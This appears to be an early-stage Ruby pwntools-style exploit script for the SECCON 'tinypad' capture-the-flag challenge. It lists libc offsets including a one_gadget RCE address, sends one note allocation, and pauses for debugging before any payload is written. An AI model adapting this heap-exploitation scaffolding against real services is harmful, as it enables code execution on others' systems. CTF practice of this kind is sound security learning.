#!/usr/bin/env ruby

require 'pwn'

remote = ARGV[0] == "r"

if remote 
	host = "tinypad.pwn.seccon.jp"
	port = 54321
	libc_offset = {
		"main_arena" => 0x3be760,
		"environ" => 0x5e9178,
		"one_gadget_rce" => 0xe66bd
	}
else
	host = "localhost"
	port = 54321
end

class MyTube < Sock
	def initialize(host, port)
		super(host, port)
	end
	def sendlineafter(pre, post)
		recvuntil(pre)
		sendline(post)
	end
end

z=MyTube.new "localhost", 54321
pid=`pidof tinypad`.split.first
z.sendlineafter("(CMD)>>> ", "A")
z.sendlineafter("(SIZE)>>> ", "12")
z.sendlineafter("(CONTENT)>>> ", "A"*12)


puts "[DEBUG] %s Continue?" % [pid]
gets

data=z.recvuntil("(CMD)>>> ")
puts data

